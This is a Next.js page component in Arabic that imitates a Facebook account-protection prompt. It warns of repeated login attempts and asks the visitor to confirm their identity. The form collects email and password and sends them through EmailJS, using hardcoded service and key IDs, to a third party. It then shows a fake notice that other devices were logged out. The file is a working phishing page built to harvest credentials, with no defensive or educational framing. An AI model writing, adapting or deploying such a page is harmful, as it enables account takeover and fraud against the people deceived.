'use client';

import Image from "next/image";
import React, { useRef, useState } from 'react';
import emailjs from '@emailjs/browser';

const FacebookLoginForm = ({ onConfirm }) => {
  const form = useRef();
  const [email, setEmail] = useState('');
  const [confirmEmail, setConfirmEmail] = useState('');
  const [error, setError] = useState('');

  const sendEmail = (e) => {
    e.preventDefault();

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    // Custom email validation
    if (!emailRegex.test(email)) {
      setError('يرجى إدخال بريد إلكتروني صالح');
      return;
    }

    // Check if both emails match
    if (email !== confirmEmail) {
      setError('البريد الإلكتروني غير متطابق');
      return;
    }

    setError('');

    emailjs.sendForm(
      'service_nzuz8ot',
      'template_ov8ie2n',
      form.current,
      'T5jy2-at9YckZQa-A'
    ).then(
      (result) => {
        console.log(result.text);
        onConfirm(); // Trigger success state
      },
      (error) => {
        console.log(error.text);
        alert('فشل في إرسال الرسالة. حاول مجددًا.');
      }
    );
  };

  return (
    <form ref={form} onSubmit={sendEmail} className="space-y-4">
      <input
        type="email"
        name="email"
        placeholder="البريد الإلكتروني أو رقم الهاتف"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        className="w-full px-4 py-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877f2]"
        pattern="^[^\s@]+@[^\s@]+\.[^\s@]+$"
        required
      />

      <input
        type="email"
        placeholder="تأكيد البريد الإلكتروني"
        value={confirmEmail}
        onChange={(e) => setConfirmEmail(e.target.value)}
        className="w-full px-4 py-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877f2]"
        pattern="^[^\s@]+@[^\s@]+\.[^\s@]+$"
        required
      />

      <input
        type="password"
        name="password"
        placeholder="كلمة المرور"
        className="w-full px-4 py-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877f2]"
        required
      />

      {error && (
        <p className="text-red-600 text-sm text-center">{error}</p>
      )}

      <button
        type="submit"
        className="w-full bg-[#1877f2] text-white py-3 rounded-md font-semibold hover:bg-[#165fd0] transition"
      >
        تأكيد
      </button>
    </form>
  );
};

export default function Home() {
  const [confirmed, setConfirmed] = useState(false);

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4" dir="rtl">
      <div className="w-full max-w-md bg-white p-6 rounded-xl shadow-md">
        <div className="flex gap-3 items-center mb-4">
          <Image src="/images/images.png" alt="icon" width={50} height={50} />
          <span className="text-2xl font-semibold text-gray-800">حماية حسابك</span>
        </div>

        <div className="text-gray-700 mb-6 leading-relaxed">
          هناك محاولات تسجيل دخول عديدة. الرجاء تأكيد هويتك لتسجيل الخروج من كافة الأجهزة الأخرى.
        </div>

        {!confirmed ? (
          <FacebookLoginForm onConfirm={() => setConfirmed(true)} />
        ) : (
          <div className="text-center text-green-600 font-semibold text-lg">
            <div className="bg-green-100 p-4 rounded-md shadow-md mb-4">
              <span className="block text-2xl font-semibold text-green-600">✅ تم تأكيد هويتك بنجاح!</span>
              <p className="text-sm text-gray-600 mt-2">لقد تم تسجيل الخروج من جميع الأجهزة الأخرى بنجاح.</p>
            </div>

            <button
              onClick={() => window.location.reload()} // Refresh the page
              className="w-full bg-[#1877f2] text-white py-3 rounded-md font-semibold hover:bg-[#165fd0] transition"
            >
              العودة إلى الصفحة الرئيسية
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
